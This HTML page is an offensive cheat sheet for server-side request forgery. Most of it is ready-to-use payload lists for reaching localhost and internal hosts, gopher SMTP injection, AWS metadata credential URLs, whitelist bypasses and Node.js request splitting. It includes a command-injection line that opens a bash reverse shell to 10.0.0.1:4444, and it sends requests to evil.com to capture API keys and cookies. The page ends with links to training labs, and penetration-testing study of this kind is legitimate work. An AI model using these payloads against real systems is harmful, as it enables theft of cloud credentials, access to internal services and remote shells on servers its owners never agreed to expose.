<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SSRF (Server-Side Request Forgery) Cheat Sheet</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Press+Start+2P&display=swap');

    :root {
      --color-dark: #050A0E;
      --color-medium: #0D1B2A;
      --color-light: #1B263B;
      --color-neon-red: #FF073A;
      --color-text-light: #c0c7d6;
    }

    * {
      font-family: 'Fira Code', monospace;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: var(--color-dark);
      color: var(--color-text-light);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(rgba(255, 7, 58, 0.1), rgba(255, 7, 58, 0.05)), url('https://www.transparenttextures.com/patterns/3px-tile.png');
      z-index: -1;
      animation: moveBackground 5s linear infinite;
    }

    @keyframes moveBackground {
      from { background-position: 0 0; }
      to { background-position: 100px 100px; }
    }

    .content-wrapper {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    h1 {
        font-family: 'Press Start 2P', cursive;
        font-size: 24px;
        color: var(--color-neon-red);
        margin-bottom: 25px;
        text-align: center;
    }

    h2, h3 {
      color: var(--color-neon-red);
      margin: 20px 0;
      border-bottom: 2px solid var(--color-neon-red);
      padding-bottom: 10px;
      text-align: left;
    }

    p {
      margin: 15px 0;
      line-height: 1.6;
      text-align: justify;
    }

    pre, code {
      background: var(--color-medium);
      padding: 15px;
      border-radius: 5px;
      font-size: 14px;
      color: var(--color-neon-red);
      border: 2px solid var(--color-neon-red);
      margin: 15px 0;
      line-height: 1.5;
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow: hidden;
    }

    strong {
      font-weight: bold;
      color: var(--color-neon-red);
    }

    /* Remove scrollbar but keep functionality */
    ::-webkit-scrollbar {
      display: none;
    }

    /* Ensure content fits without scrolling */
    pre {
      max-width: 100%;
    }

    /* Improve code block readability */
    code {
      display: block;
      padding: 1em;
    }

    /* Style for links */
    .content-wrapper a {
      color: var(--color-neon-red);
      text-decoration: none;
    }

    .content-wrapper a:hover {
      text-decoration: underline;
    }

    @keyframes glitch {
      0% { text-shadow: 2px 2px var(--color-neon-red); }
      50% { text-shadow: -2px -2px var(--color-neon-red); }
      100% { text-shadow: 2px -2px var(--color-neon-red); }
    }
  </style>
</head>
<body>
  <div class="content-wrapper">
    <br>
    <br>
    <h1>SSRF (Server-Side Request Forgery)</h1>

    <h2>SSRF Capture Tools</h2>
    <p>If we want to capture incoming requests from target website/server, there is a lot of open-source tools available.</p>

    <h3>Ngrok</h3>
    <p><a href="https://ngrok.com/">https://ngrok.com/</a></p>
    <pre><code>ngrok http 80

# Force http scheme (not https)
ngrok http --scheme=http 8090 --host-header=localhost:8090
</code></pre>
    <p>Then start your local web server for fetching requests forwarded from the <code>ngrok</code> server.</p>
    <pre><code>sudo python3 -m http.server 80
# or
python3 -m http.server 8090
</code></pre>
    <p>After starting <code>ngrok</code> and local web server, we can use the URL such as<br>
       <code>https://abcd-12-3-45-678.ngrok-free.app</code></p>

    <h3>Localhost.run</h3>
    <p><a href="http://localhost.run/">http://localhost.run/</a></p>
    <p>As mentioned in the official documentation,</p>
    <pre><code># If you don't already have an SSH key, generate it first.
ssh-keygen -t rsa

# Port forwarding to your local 8080 port.
ssh -R 80:localhost:8080 localhost.run
</code></pre>
    <p>After running the command above, copy generated URL such as<br>
       <code>abcdef123456789.lhr.life</code> Requests sent to this URL will be forwarded to your <code>localhost:8080</code></p>

    <h3>LocalXpose</h3>
    <p><a href="https://localxpose.io/">LocalXpose</a> is a reverse proxy that enables you to expose your <a href="http://localhost/">localhost</a> to the internet. To use it, we need to sign up and obtain an Access Token.</p>
    <ol>
      <li>Login using Access Token.
        <pre><code>loclx account login</code></pre>
      </li>
      <li>Open browser to access GUI version.
        <pre><code>loclx</code></pre>
      </li>
    </ol>

    <h3>Pastebin</h3>
    <p><a href="https://pastebin.com/">https://pastebin.com/</a></p>
    <p>After writing the content in there, we can easily use the <code>raw</code> page such as<br>
       <a href="https://pastebin.com/raw/abcdefgh">https://pastebin.com/raw/abcdefgh</a>.</p>

    <h3>Interactsh</h3>
    <p><a href="https://github.com/projectdiscovery/interactsh">Interactsh</a></p>
    <pre><code>interactsh-client -v</code></pre>

    <h3>Other Tools</h3>
    <ul>
      <li><a href="https://webhook.site/">Webhook.site</a></li>
      <li><a href="https://pingb.in/">pingb.in</a></li>
    </ul>

    <h3>Local Web Server</h3>
    <p>Also we can simply open a local web server if the local machine accepts external requests.</p>
    <pre><code>python3 -m http.server 8000</code></pre>

    <h2>HTTP (http://)</h2>
    <p>We may be able to use another server in the target machine. For example, pass the localhost URL to the GET parameters. Also these are available in POST params.</p>
    <pre><code># Localhost
?url=http://localhost/
?url=http://127.0.0.1/
?url=http://127.0.0.1:80/
?url=http://127.0.0.1:3000/
?url=http://127.0.0.1:8000/
?url=http://127.0.0.1:8080/
?url=http://0/
?url=http://2130706433/
?url=http://017700000001/
?url=http://127.1/
?url=http://127.0.0.1/test.php%00
?url=http://127.0.0.1/test.php\x00

# Backend URL (e.g. 192.168.0.x)
?url=http://192.168.0.23/
?url=http://192.168.0.23:80/
?url=http://192.168.0.23:3000/
?url=http://192.168.0.23:8000/
?url=http://192.168.0.23:8080/

# Server status
?url=http://localhost/server-status

# At sign
?url=test@sub.example.com/index.php
</code></pre>

    <h3>Local Port Enumeration</h3>
    <p>We can find which port is opening by fuzzing port number.</p>
    <pre><code>seq 1 65535 | ffuf -u https://example.com/?url=http://127.0.0.1:FUZZ -w -</code></pre>

    <h2>Gopher (gopher://)</h2>
    <p>We may be able to use <code>gopher://</code> scheme.</p>
    <h3>Automation</h3>
    <p>We can use <a href="https://github.com/someone/Gopherus">Gopherus</a> to create a payload automatically.</p>

    <h3>SMTP</h3>
    <p>At first, we need to prepare a payload for sending message to victim user.</p>
    <pre><code>gopher://127.0.0.1:25/_MAIL FROM:&lt;john@example.com&gt;
RCPT TO:&lt;mike@example.com&gt;
DATA
From:john@gofer.htb
Subject:Test
Hi, I'm not hacker.
</code></pre>
    <p>The payload above can be URL encoded with tools such as CyberChef. Then the encoded payload is as follows:</p>
    <pre><code>gopher://127.0.0.1:25/_MAIL%20FROM:%3Cjohn@example.com%3E%0ARCPT%20TO:%3Cmike@example.com%3E%0ADATA%0AFrom:john@gofer.htb%0ASubject:Test%0AHi,%20I'm%20not%20hacker.%0A.
</code></pre>
    <p>We can use it to SSRF.</p>
    <pre><code>?url=gopher://127.0.0.1:25/_MAIL...
</code></pre>

    <h2>Images</h2>
    <p>We might be able to allow a website to load images from our server. First, create a Base64 encoded URL:</p>
    <pre><code>echo -n 'https://attacker.com/image.png' | base64
</code></pre>
    <p>Then create a payload as below:</p>
    <pre><code>&lt;img src='data:image/png;base64,&lt;BASE64&gt;'/&gt;
</code></pre>

    <h2>Listen HTTP Request</h2>
    <p>If the website is vulnerable to SSRF, we can fetch sensitive information in HTTP request by sniffing.<br>
       First off, start a listener in local machine.</p>
    <pre><code>sudo nc -lvp 80</code></pre>
    <p>Then send request that is affected by SSRF.</p>
    <pre><code>https://example.com/mail?server=http://evil.com
</code></pre>
    <p>See the HTTP request in local machine. We might be able to fetch the sensitive data such as API key, Cookie, etc.</p>

    <h2>OS Command Injection</h2>
    <pre><code>?url=http://127.0.0.1:3000/test;whoami
?url=http://127.0.0.1:3000/test;ping+-c+1+10.0.0.1
# Reverse Shell
?url=http://127.0.0.1:3000/;bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
</code></pre>

    <h2>Admin Operations</h2>
    <p>We may be able to operate significant stuff as the admin user via local server.</p>
    <pre><code># Localhost
?url=http://localhost/admin
?url=http://localhost/admin/delete?username=john
?url=http://127.1/%25%36%31dmin

# Backend URL (e.g. 192.168.0.x)
?url=http://192.168.0.23/admin
?url=http://192.168.0.23/admin/delete?username=john
</code></pre>

    <h2>Whitelisted URL Bypass</h2>
    <p>If the target website allows only the whitelisted URL, we can use them.<br>
       Assume only "example.com" is allowed by the target website.</p>
    <pre><code>?url=http://localhost@example.com/
?url=http://localhost%25%32%33@example.com/
</code></pre>

    <h2>AWS Instances</h2>
    <pre><code>?url=http://169.254.169.254/latest/dynamic/instance-identity/
?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
</code></pre>

    <h2>Internal Kubernetes Services</h2>
    <p><code>?url=http://&lt;service&gt;.&lt;namespace&gt;.svc.cluster.local</code></p>
    <p>If we can access the target system, get the service names/namespaces with the following commands:</p>
    <pre><code>kubectl get svc
kubectl get namespaces
</code></pre>

    <h2>Hostname Bypass</h2>
    <h3>1. Add Target Domain to <code>/etc/hosts</code> in Local Machine</h3>
    <pre><code>x.x.x.x sub.example.com</code></pre>
    <p>Restart the hostname service to apply the configuration immediately.</p>
    <pre><code>sudo systemctl restart systemd-hostnamed</code></pre>
    <h3>2. Access to the Domain We Specified</h3>
    <pre><code>https://example.com/?proxy=https://sub.example.com</code></pre>

    <h2>API Request</h2>
    <p>We might be able to get information from an API endpoint that is not accessible normally.</p>
    <pre><code>?url=https://api.example.com/users
?url=https://api.example.com@internal-api.example.com/users
</code></pre>

    <h2>Reveal Filtered Websites via Monitoring Tools (Webhook)</h2>
    <p>Some web apps may have monitoring tools that check the health of external websites. You may be able to reveal hidden contents of the target via the monitor. First off, create a redirect server using Python. Here it's named "redirect.py".</p>
    <pre><code>#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[1])
        self.end_headers()

HTTPServer(("0.0.0.0", 8000), Redirect).serve_forever()
</code></pre>
    <p>After creating, run the following command. Assume that the filtered port is 3000 (nmap will reveal it).</p>
    <pre><code>python3 redirect.py http://127.0.0.1:3000</code></pre>
    <p>And start listener for receiving the POST request of the webhook from the target website.</p>
    <pre><code>nc -lvnp 4444</code></pre>
    <p>Now set the configuration of the webhook. For example:</p>
    <pre><code>Payload URL: http://&lt;local-ip&gt;:4444/
Monitored URL: http://&lt;local-ip&gt;:8000/
</code></pre>
    <p>You can see the contents of the filtered app.</p>

    <h2>Request Splitting</h2>
    <p>Reference: <a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a></p>
    <p>It is the vulnerability of the Node.js <code>http.get</code> module, which allows an attacker to insert HTTP headers and bodies by splitting the request. First off, prepare HTTP headers and body as below:</p>
    <pre><code>HTTP/1.1

POST /update HTTP1.1
Content-Length: 28

username=admin&password=newpass

GET
</code></pre>
    <p>Then manipulate it for sending to target.</p>
    <pre><code># \u0120: space
# \u010D: \r
# \u010A: \n
?url=http://example.com\u0120HTTP/1.1\u010D\u010APOST\u0120/update\u0120HTTP/1.1\u010D\u010AContent-Length:\u012028\u010D\u010A\u010D\u010Ausername=admin&password=pass\u010D\u010A\u010D\u010AGET\u0120
</code></pre>
<h2>Labs</h2>
<p>Nginx - SSRF Misconfiguration: <a href="https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration">Root-me</a></p>
<p>Server Side Request Forgery: <a href="https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery">Root-me</a></p>
<p>Blind SSRF with out-of-band detection: <a href="https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection">Port-Swigger</a></p>
<p>SSRF with blacklist-based input filter: <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter">Port-Swigger</a></p>
<p>Blind SSRF with Shellshock exploitation: <a href="https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation">Port-Swigger</a></p>

  </div>
  
</body>
</html>
